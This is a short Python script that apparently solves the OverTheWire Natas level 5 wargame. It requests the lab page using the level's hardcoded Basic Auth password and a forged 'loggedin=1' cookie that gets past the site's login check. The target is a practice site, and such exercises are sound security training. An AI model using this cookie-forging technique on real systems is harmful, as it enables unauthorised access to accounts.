import requests
from requests.auth import HTTPBasicAuth

r = 'http://natas5.natas.labs.overthewire.org/'

req = requests.get(r, headers = {'cookie':'__utma=176859643.878541458.1620330276.1622641965.1622647923.17; __utmz=176859643.1620524633.4.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643; loggedin=1'}, auth = HTTPBasicAuth('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'))

print(req.text)